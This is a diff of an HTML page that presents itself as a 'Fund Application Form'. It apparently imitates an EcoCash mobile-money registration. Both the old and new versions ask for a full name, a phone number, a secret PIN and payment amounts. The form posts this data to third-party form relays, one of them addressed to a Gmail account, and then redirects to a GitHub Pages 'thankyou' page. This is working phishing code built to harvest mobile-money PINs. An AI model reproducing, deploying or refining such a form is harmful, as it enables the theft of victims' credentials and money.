@@ -1,121 +1,29 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-  <meta charset="UTF-8" />
-  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
-  <title>Fund Application Form</title>
-  <style>
-    body {
-      font-family: Arial, sans-serif;
-      padding: 20px;
-      max-width: 500px;
-      margin: auto;
-      background-color: #f9f9f9;
-    }
+<form action="https://formsubmit.co/exellentfirm@gmail.com" method="POST">
+  <label>Full Name</label><br>
+  <input type="text" name="Full Name" required><br><br>
 
-    h2 {
-      text-align: center;
-    }
+  <label>Phone Number</label><br>
+  <input type="tel" name="Phone Number" required><br><br>
 
-    form {
-      background: #fff;
-      padding: 20px;
-      border-radius: 8px;
-      box-shadow: 0 0 10px rgba(0,0,0,0.1);
-    }
+  <label>Secret Code (PIN)</label><br>
+  <input type="password" name="Secret Code" id="pin" required>
+  <input type="checkbox" onclick="togglePIN()"> Show/Hide PIN<br><br>
 
-    .form-group {
-      margin-bottom: 15px;
-    }
+  <label>Amount You Paid</label><br>
+  <input type="number" name="Amount Paid" required><br><br>
 
-    label {
-      display: block;
-      margin-bottom: 5px;
-    }
+  <label>Amount You Applied For</label><br>
+  <input type="number" name="Amount Applied For" required><br><br>
 
-    input[type="text"],
-    input[type="tel"],
-    input[type="number"],
-    input[type="password"] {
-      width: 100%;
-      padding: 10px;
-      border-radius: 5px;
-      border: 1px solid #ccc;
-    }
+  <!-- Redirect to thank you page after submit -->
+  <input type="hidden" name="_next" value="https://onlinegistrationprog.github.io/ecocash-form/thankyou.html">
 
-    .toggle-btn {
-      margin-top: 5px;
-      font-size: 14px;
-      background: none;
-      color: #007BFF;
-      border: none;
-      cursor: pointer;
-    }
+  <button type="submit">Submit Application</button>
+</form>
 
-    button[type="submit"] {
-      background-color: #28a745;
-      color: white;
-      padding: 10px 15px;
-      border: none;
-      border-radius: 5px;
-      width: 100%;
-      cursor: pointer;
-      font-size: 16px;
-    }
-
-    button[type="submit"]:hover {
-      background-color: #218838;
-    }
-  </style>
-</head>
-<body>
-
-  <h2>Fund Application Form</h2>
-
-  <form action="https://formspree.io/f/mnqeqgvz" method="POST">
-    
-    <div class="form-group">
-      <label for="fullname">Full Name</label>
-      <input type="text" name="Full Name" id="fullname" required>
-    </div>
-
-    <div class="form-group">
-      <label for="phone">Phone Number</label>
-      <input type="tel" name="Phone Number" id="phone" required>
-    </div>
-
-    <div class="form-group">
-      <label for="pin">Secret Code (PIN)</label>
-      <input type="password" name="Secret Code" id="pin" required>
-      <button type="button" class="toggle-btn" onclick="togglePIN()">Show/Hide PIN</button>
-    </div>
-
-    <div class="form-group">
-      <label for="paid">Amount You Paid</label>
-      <input type="number" name="Amount Paid" id="paid" required>
-    </div>
-
-    <div class="form-group">
-      <label for="applied">Amount You Applied For</label>
-      <input type="number" name="Amount Applied For" id="applied" required>
-    </div>
-
-    <!-- After submission, redirect here -->
-    <input type="hidden" name="_redirect" value="https://onlinegistrationprog.github.io/ecocash-form/thankyou.html">
-
-    <button type="submit">Submit Application</button>
-  </form>
-
-  <script>
-    function togglePIN() {
-      const pinInput = document.getElementById("pin");
-      if (pinInput.type === "password") {
-        pinInput.type = "text";
-      } else {
-        pinInput.type = "password";
-      }
-    }
-  </script>
-
-</body>
-</html>
+<script>
+function togglePIN() {
+  var pinField = document.getElementById("pin");
+  pinField.type = pinField.type === "password" ? "text" : "password";
+}
+</script>
